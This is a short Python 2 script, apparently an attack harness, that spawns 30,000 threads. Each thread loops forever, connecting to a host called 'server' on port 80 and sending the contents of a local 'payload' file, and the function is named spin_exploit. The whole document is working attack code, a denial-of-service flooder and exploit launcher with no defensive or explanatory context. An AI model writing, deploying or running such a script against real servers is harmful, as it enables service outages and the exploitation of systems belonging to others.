#!/usr/bin/python

import socket
import threading

THREADS = 30000 

def spin_exploit():
 while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(("server", 80))
      payload = ""
      with open("payload", "r") as f:
        payload = f.read()
        s.send(payload)
        #print s.read(1024)
        s.close()
    except Exception, e:
      print "got exception " + str(e)

class ThreadClass(threading.Thread):
  def run(self):
    spin_exploit()

def main():
  for i in range(THREADS):
    #try:
    t = ThreadClass()
    t.start()
    #except:
      #pass
      #print "caught exception while trying to make %dth thread" % i

main()